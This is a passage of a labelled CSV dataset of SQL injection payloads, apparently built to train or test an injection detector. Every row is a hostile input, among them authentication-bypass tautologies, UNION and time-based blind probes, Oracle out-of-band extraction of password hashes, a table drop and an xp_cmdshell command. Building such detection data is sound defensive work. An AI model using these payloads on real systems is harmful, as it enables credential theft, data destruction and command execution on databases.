row_index,payload_norm,label,sqli_type_hint
420,declare @s varchar ( 200 ) select @s = 0x73656c65637420404076657273696f6e exec ( @s ),1,
421,select * from users where id = '1' or 1 = 1 -- 1',1,
422,AND 1 = utl_inaddr.get_host_address ( ( SELECT COUNT ( DISTINCT ( table_name ) ) FROM sys.all_tables ) ) AND 'i' = 'i,1,
423,"select * from users where id = '1' union select @ 1,version ( ) -- 1'",1,
424,"admin"" ) or ( ""1"" = ""1""#",1,
425,"select * from users where id = 1 or 1#"", union select 'a',version ( ) -- 1",1,
426,"select * from users where id = 1 or ""$ ( "" or 1 = 1 -- 1",1,
427,or '' ',1,
428,"select * from users where id = 1 or "";#"" or 1 = 1 -- 1",1,
429,; drop table temp --,1,
430,"AND 1 = utl_inaddr.get_host_address ( ( SELECT DISTINCT ( PASSWORD ) FROM ( SELECT DISTINCT ( PASSWORD ) , ROWNUM AS LIMIT FROM SYS.USER$ ) WHERE LIMIT = 2 ) ) AND 'i' = 'i",1,
431,""" or benchmark ( 10000000,MD5 ( 1 ) ) #",1,
432,""" or ""x"" = ""x",1,
433,select * from users where id = '1'<@.. or 1 = 1 -- 1',1,
434,"select * from users where id = 1 or !<@ union select 1,version ( ) -- 1",1,
435,or 'something' like 'some%',1,
436,; if not ( ( select serverproperty ( 'isintegratedsecurityonly' ) ) <> 0 ) waitfor delay '0:0:2' --,1,
437,"AND 1 = utl_inaddr.get_host_address ( ( SELECT DISTINCT ( PASSWORD ) FROM ( SELECT DISTINCT ( PASSWORD ) , ROWNUM AS LIMIT FROM SYS.USER$ ) WHERE LIMIT = 4 ) ) AND 'i' = 'i",1,
438,select * from users where id = '1' or \<\. or 1 = 1 -- 1',1,
439,; exec master..xp_cmdshell 'ping 10.10.1.2'--,1,
440,admin' or '1' = '1'--,1,
441,; if not ( ( select serverproperty ( 'isintegratedsecurityonly' ) ) <> 1 ) waitfor delay '0:0:2' --,1,
442,"AND 1 = utl_inaddr.get_host_address ( ( SELECT DISTINCT ( table_name ) FROM ( SELECT DISTINCT ( table_name ) , ROWNUM AS LIMIT FROM sys.all_tables ) WHERE LIMIT = 2 ) ) AND 'i' = 'i",1,
443,"select * from users where id = 1 <@<@ union select version ( ) ,version ( ) -- 1",1,
444,"select * from users where id = 1 or 1#""$ union select null,version ( ) -- 1",1,
445,""";waitfor delay '0:0:__TIME__'--",1,
446,select * from users where id = '1' *$ 1 or 1 = 1 -- 1',1,
447,"select * from users where id = 1 or \<\ union select null,@@VERSION -- 1",1,
448,"select * from users where id = 1 or ""?@"" or 1 = 1 -- 1",1,
449,’ or ‘1’ = ’1,1,
